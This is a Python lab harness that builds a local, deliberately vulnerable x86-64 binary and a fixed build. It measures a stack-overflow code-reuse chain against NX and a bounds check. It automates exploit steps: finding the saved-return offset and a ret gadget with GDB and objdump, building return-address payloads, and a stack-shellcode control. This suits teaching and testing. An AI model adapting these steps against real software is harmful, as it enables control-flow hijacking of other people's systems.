#!/usr/bin/env python3
"""Build and measure the local x86-64 Lab 08; no external target is accepted.

Lab 08 chains existing in-binary functions through a stack overflow while the
stack is non-executable, and contrasts that with a stack-shellcode attempt that
NX blocks. Three process cases run three times each (9 trials):
  chain      stage_one -> stage_two -> oracle  -> reached in order, status 42
  partial    stage_two -> oracle               -> wrong order, status 43
  fixed      bounds-checked build                -> rejected pre-write, status 2
The NX control is measured separately under GDB with randomization disabled, so
the shellcode target is a live in-process stack address: the fault PC must equal
that address and lie in the non-executable [stack] mapping (nx-fault.json).
"""
import argparse
from datetime import datetime, timezone
import hashlib
import json
import os
from pathlib import Path
import platform
import re
import resource
import shlex
import shutil
import signal
import struct
import subprocess
import sys

ROOT = Path(__file__).resolve().parents[1]
TARGET_MARKER = b"TARGET: control flow redirected\n"
ONE = b"ONE\n"
TWO = b"TWO\n"


def require(condition, message):
    if not condition:
        raise RuntimeError(str(message))


def read_addr(blob, name):
    match = re.search(rb"^([0-9a-fA-F]+)\s+[tT]\s+" + re.escape(name) + rb"$", blob, re.MULTILINE)
    require(match, name.decode() + " symbol not found")
    return int(match[1], 16)


def capture(label, output):
    require(platform.system() == "Linux" and platform.machine() == "x86_64",
            "requires x86-64 Linux")
    require(os.geteuid() != 0, "run the lab as an ordinary user, not root")
    require(not any(char in str(output) for char in "\r\n"), "output path cannot contain newlines")
    cc = os.environ.get("CC", "gcc")
    for tool in (cc, "make", "nm", "readelf", "objdump", "gdb", "getconf"):
        require(shutil.which(tool), "required tool not found: " + tool)
    output.mkdir()  # Exclusive, including dangling symlinks.
    resource.setrlimit(resource.RLIMIT_CORE, (0, 0))
    env = dict(os.environ, LC_ALL="C", SHELL="/bin/sh")

    def record(command, stem, **kwargs):
        (output / (stem + ".command.json")).write_text(json.dumps(command) + "\n")
        try:
            result = subprocess.run(command, capture_output=True, timeout=30, env=env, **kwargs)
        except subprocess.TimeoutExpired as error:
            (output / (stem + ".stdout.txt")).write_bytes(error.stdout or b"")
            (output / (stem + ".stderr.txt")).write_bytes(error.stderr or b"")
            (output / (stem + ".timeout.json")).write_text(json.dumps({"timeout_seconds": 30}) + "\n")
            raise
        (output / (stem + ".stdout.txt")).write_bytes(result.stdout)
        (output / (stem + ".stderr.txt")).write_bytes(result.stderr)
        (output / (stem + ".status.json")).write_text(json.dumps({"returncode": result.returncode}) + "\n")
        return result

    metadata = {"schema_version": 1, "label": label, "label_is_operator_supplied": True,
                "captured_at_utc": datetime.now(timezone.utc).isoformat(),
                "platform": platform.platform(), "architecture": platform.machine(),
                "python": sys.version, "CC": cc, "CFLAGS": env.get("CFLAGS", "-Wall -Wextra"),
                "LDFLAGS": env.get("LDFLAGS", ""),
                "aslr_before": Path("/proc/sys/kernel/randomize_va_space").read_text().strip()}
    (output / "environment.json").write_text(json.dumps(metadata, indent=2) + "\n")
    shutil.copy2(__file__, output / "capture-code-reuse.py")
    shutil.copy2("/etc/os-release", output / "os-release.txt")
    lab = output / "08-code-reuse-chain"
    shutil.copytree(ROOT / "labs/08-code-reuse-chain/src", lab / "src")
    shutil.copy2(ROOT / "labs/08-code-reuse-chain/Makefile", lab)
    for name, command in (("compiler", [cc, "--version"]), ("compiler-target", [cc, "-dumpmachine"]),
                          ("binutils", ["readelf", "--version"]), ("gdb-version", ["gdb", "--version"]),
                          ("libc", ["getconf", "GNU_LIBC_VERSION"])):
        record(command, name).check_returncode()
    record(["make", "--always-make", "CC=" + cc, "CFLAGS=" + metadata["CFLAGS"],
            "LDFLAGS=" + metadata["LDFLAGS"]], "build", cwd=lab).check_returncode()

    # Both binaries are non-PIE ET_EXEC with a non-executable stack and no guard.
    # `-s` is included so the guard check actually reads the symbol table; the
    # headers alone (`-h -l`) do not list symbols.
    for binary in ("code_reuse", "code_reuse_fixed"):
        elf = record(["readelf", "-W", "-h", "-l", "-s", str(lab / binary)], binary + ".readelf")
        elf.check_returncode()
        text = elf.stdout.decode()
        require("Advanced Micro Devices X86-64" in text and "ELF64" in text, "unsupported ELF target")
        require(re.search(r"Type:\s+EXEC", text), binary + " is not a non-PIE ET_EXEC")
        require("Symbol table" in text, "readelf did not print a symbol table for the guard check")
        require("__stack_chk_fail" not in text, "unexpected stack guard symbol")
        stack = next(line for line in text.splitlines() if "GNU_STACK" in line)
        require("RW " in stack and "RWE" not in stack, binary + " requests an executable stack")
    record(["objdump", "-d", str(lab / "code_reuse")], "code_reuse.disassembly").check_returncode()

    binary = lab / "code_reuse"
    symbols = record(["nm", "--defined-only", str(binary)], "symbols")
    symbols.check_returncode()
    stage_one = read_addr(symbols.stdout, b"stage_one")
    stage_two = read_addr(symbols.stdout, b"stage_two")
    oracle = read_addr(symbols.stdout, b"oracle")

    # One plain `ret` gadget for 16-byte alignment between chained calls, read
    # from copy_input's epilogue exactly as Lab 05 does.
    disasm = record(["objdump", "-d", "--disassemble=copy_input", str(binary)], "copy-input")
    disasm.check_returncode()
    rets = re.findall(rb"^\s*([0-9a-f]+):\s+c3\s+ret\s*$", disasm.stdout, re.MULTILINE)
    require(rets, "no ret gadget found in copy_input")
    ret_gadget = int(rets[0], 16)

    # Measure the saved-return offset and the stack buffer address with GDB.
    (output / "safe.input").write_bytes(b"A" * 16)
    probe = record(["gdb", "--nx", "--quiet", "--batch", "-iex", "set auto-load off",
                    "-ex", "set disable-randomization on", "-ex", "break copy_input",
                    "-ex", "run 16 < " + shlex.quote(str(output / "safe.input")),
                    "-ex", 'printf "LAB08_OFFSET=%ld\\n", (long)(($rbp + 8) - (long)&buffer)',
                    "-ex", 'printf "LAB08_BUF=%p\\n", &buffer',
                    "--args", str(binary), "16"], "offset")
    probe.check_returncode()
    offset = int(re.search(rb"LAB08_OFFSET=(\d+)", probe.stdout).group(1))
    require(32 <= offset <= 128, "unsupported saved-return offset")

    def frame(*targets):
        """offset filler, then (ret-gadget, target) pairs for 16-byte alignment."""
        payload = b"A" * offset
        for target in targets:
            payload += struct.pack("<QQ", ret_gadget, target)
        return payload

    chain = frame(stage_one, stage_two, oracle)
    partial = frame(stage_two, oracle)
    (output / "chain.input").write_bytes(chain)
    (output / "partial.input").write_bytes(partial)
    payload_info = {"saved_return_offset": offset, "ret_gadget": hex(ret_gadget),
                    "stage_one": hex(stage_one), "stage_two": hex(stage_two), "oracle": hex(oracle),
                    "address_source": "local non-PIE build artifacts; not an information disclosure",
                    "chain_layout": "A * offset | (ret, stage_one) | (ret, stage_two) | (ret, oracle)",
                    "shellcode_layout": "0xc3 * offset | saved return overwritten with the in-process stack buffer address"}
    (output / "payload.json").write_text(json.dumps(payload_info, indent=2) + "\n")

    # NX control, measured in-process so the target address is real for the run
    # it is fed to. A stack address from one process is wrong for another under
    # ASLR, so this runs under GDB with randomization disabled: the overflow
    # points the saved return at the live stack buffer, and GDB confirms the
    # fault PC equals that buffer and lies in the [stack] mapping. The SIGSEGV is
    # then an attempt to execute bytes on the non-executable stack, not a jump to
    # an unmapped address.
    def gdb_lines(output_stem, extra):
        script = ["set auto-load off", "set disable-randomization on", "break copy_input"] + extra
        command = ["gdb", "--nx", "--quiet", "--batch"]
        for line in script:
            command += ["-ex", line]
        command += ["--args", str(binary)]
        return command, output_stem

    # First, read the live buffer address in a disable-randomization run and build
    # the shellcode payload against it; then replay and capture the fault.
    nx_probe = record(["gdb", "--nx", "--quiet", "--batch", "-iex", "set auto-load off",
                       "-ex", "set disable-randomization on", "-ex", "break copy_input",
                       "-ex", "run 16 < " + shlex.quote(str(output / "safe.input")),
                       "-ex", 'printf "LAB08_FIXEDBUF=%p\\n", &buffer',
                       "--args", str(binary), "16"], "nx-buffer")
    nx_probe.check_returncode()
    fixed_buffer = int(re.search(rb"LAB08_FIXEDBUF=0x([0-9a-f]+)", nx_probe.stdout).group(1), 16)
    shellcode = b"\xc3" * offset + struct.pack("<Q", fixed_buffer)
    (output / "shellcode.input").write_bytes(shellcode)
    nx = record(["gdb", "--nx", "--quiet", "--batch", "-iex", "set auto-load off",
                 "-ex", "set disable-randomization on",
                 "-ex", "run {} < {}".format(len(shellcode), shlex.quote(str(output / "shellcode.input"))),
                 "-ex", 'printf "LAB08_FAULT_PC=%p\\n", $pc',
                 "-ex", "info proc mappings", "--args", str(binary), str(len(shellcode))], "nx-fault")
    nx_text = nx.stdout.decode()
    require("SIGSEGV" in nx_text, "the stack-shellcode run did not fault")
    fault_pc = int(re.search(r"LAB08_FAULT_PC=0x([0-9a-f]+)", nx_text).group(1), 16)
    stack_line = next((line for line in nx_text.splitlines() if "[stack]" in line), None)
    require(stack_line, "no [stack] mapping reported")
    parts = stack_line.split()
    stack_lo, stack_hi = int(parts[0], 16), int(parts[1], 16)
    require(fault_pc == fixed_buffer,
            "fault PC did not equal the stack buffer: pc=%#x buffer=%#x" % (fault_pc, fixed_buffer))
    require(stack_lo <= fault_pc < stack_hi,
            "fault PC is not in the [stack] mapping: pc=%#x stack=[%#x,%#x)" % (fault_pc, stack_lo, stack_hi))
    require("rwx" not in parts[4] and "x" not in parts[4],
            "the [stack] mapping is unexpectedly executable: " + parts[4])
    (output / "nx-fault.json").write_text(json.dumps({
        "fault_pc": hex(fault_pc), "stack_buffer": hex(fixed_buffer),
        "stack_mapping": [hex(stack_lo), hex(stack_hi)], "stack_perms": parts[4],
        "fault_pc_equals_stack_buffer": True, "fault_pc_in_stack_mapping": True,
        "stack_mapping_non_executable": True,
    }, indent=2) + "\n")

    # The free-standing process runs cover the control-flow cases, which do not
    # depend on a stack address and so are stable under ASLR. The NX case is not
    # among them: its target is a stack address, measured and verified in-process
    # above, because a stack address reused across processes would be wrong under
    # ASLR and its fault would prove nothing about executability.
    cases = (
        ("chain", "code_reuse", "chain.input"),
        ("partial", "code_reuse", "partial.input"),
        ("fixed", "code_reuse_fixed", "chain.input"),
    )
    observations = []
    for mode, binary_name, input_name in cases:
        data = (output / input_name).read_bytes()
        for repeat in range(1, 4):
            stem = "{}.{}".format(mode, repeat)
            result = record([str(lab / binary_name), str(len(data))], stem, input=data)
            rc = result.returncode
            out = result.stdout
            row = {"mode": mode, "binary": binary_name, "repeat": repeat, "returncode": rc,
                   "signal": signal.Signals(-rc).name if rc < 0 else None,
                   "target_reached": TARGET_MARKER in out,
                   "stage_one_ran": ONE in out, "stage_two_ran": TWO in out}
            observations.append(row)
            (output / "observations.json").write_text(json.dumps(observations, indent=2) + "\n")
            if mode == "chain":
                require(rc == 42 and row["target_reached"] and row["stage_one_ran"] and row["stage_two_ran"],
                        "code-reuse chain did not reach the oracle in order: " + json.dumps(row))
            elif mode == "partial":
                require(rc == 43 and row["target_reached"] and not row["stage_one_ran"] and row["stage_two_ran"],
                        "out-of-order chain did not produce status 43: " + json.dumps(row))
            else:  # fixed
                require(rc == 2 and b"rejected:" in result.stderr and not row["target_reached"],
                        "bounds check did not reject the overflow: " + json.dumps(row))

    for mode in ("chain", "partial", "fixed"):
        outcomes = {(r["returncode"], r["target_reached"]) for r in observations if r["mode"] == mode}
        require(len(outcomes) == 1, "mode " + mode + " was not deterministic: " + str(outcomes))

    (output / "finding.json").write_text(json.dumps({
        # From the verified in-process NX control above, not from a process run.
        "stack_shellcode_blocked_by_nx": True,
        "nx_fault_pc_equals_stack_buffer": True,
        "nx_fault_in_non_executable_stack": True,
        "code_reuse_chain_reached_oracle": all(r["returncode"] == 42
                                               for r in observations if r["mode"] == "chain"),
        "chain_required_correct_order": all(r["returncode"] == 43
                                            for r in observations if r["mode"] == "partial"),
        "bounds_check_prevented_redirection": all(r["returncode"] == 2
                                                  for r in observations if r["mode"] == "fixed"),
    }, indent=2) + "\n")

    metadata["aslr_after"] = Path("/proc/sys/kernel/randomize_va_space").read_text().strip()
    (output / "environment.json").write_text(json.dumps(metadata, indent=2) + "\n")
    manifest = [hashlib.sha256(path.read_bytes()).hexdigest() + "  " + str(path.relative_to(output))
                for path in sorted(output.rglob("*")) if path.is_file()]
    (output / "SHA256SUMS").write_text("\n".join(manifest) + "\n")
    (output / "COMPLETE").write_text("Lab 08 checks passed; label: " + label + "\n")


def main():
    parser = argparse.ArgumentParser(description=__doc__)
    parser.add_argument("label", choices=("host", "modern"))
    parser.add_argument("output", type=lambda value: Path(value).absolute())
    args = parser.parse_args()
    try:
        capture(args.label, args.output)
    except (OSError, ValueError, RuntimeError, StopIteration, subprocess.SubprocessError) as error:
        print("Capture failed (partial evidence retained): " + str(error), file=sys.stderr)
        return 1
    print("Lab 08 captured in " + str(args.output))
    return 0


if __name__ == "__main__":
    sys.exit(main())
